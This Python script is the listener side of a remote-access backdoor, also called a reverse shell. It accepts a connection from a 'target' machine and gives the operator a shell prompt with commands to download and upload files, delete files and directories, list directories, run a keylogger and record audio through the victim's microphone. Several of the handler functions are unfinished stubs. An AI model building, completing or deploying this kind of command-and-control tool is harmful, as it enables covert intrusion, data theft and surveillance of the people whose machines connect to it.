import socket
import json
import os
import select
import sounddevice
from scipy.io.wavfile import write

def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(8760).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb')
	chunk = target.recv(1024)
	target.settimeout(1)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(8760)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()
def makefile(file_name):
	f=open(file_name,'wb+')
	target.send(f.read())
def makedir(dir_name):
	target.settimeout(1)

def remove_dir(dir_name):
	target.settimeout(1)
def listdir(file_name,path="/"):
	target.settimeout(1)
def keyPressed():
	target.settimeout(1)
def remove_file(file_name):
	target.settimeout(1)
def savefile(sec=10):
	target.settimeout(10)
def target_communication():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command)
		if command == 'quit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:8] == 'makefile':
                        makefile(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		elif command[:6]== 'remove':
			remove_file(command[7:])
		elif command[:7]=='makedir':
			makedir(command[8:])
		elif command[:5]=='rmdir':
			remove_dir(command[6:])
		elif command[:7]=='listdir':
			listdir("listdirect.txt",path='/')
			download_file("listdirect.txt")
		elif command == 'keylogger':
			keyPressed()

		elif command == 'vcrecord':
			savefile(sec=10)
		else:
			result = reliable_recv()
			print(result)



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('Your HOST Server IP', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip),'\nPOSSIBLE ACTIONS: 1)download filename\n 2)upload filename\n 3)makefile filename\n 4)remove filename\n 5)makedir directoryname\n 6)rmdir directoryname\n 7)listdir\n 8)keylogger\n 9)vcrecord\n 10)clear \n 11)cd \n12)quit')
target_communication()
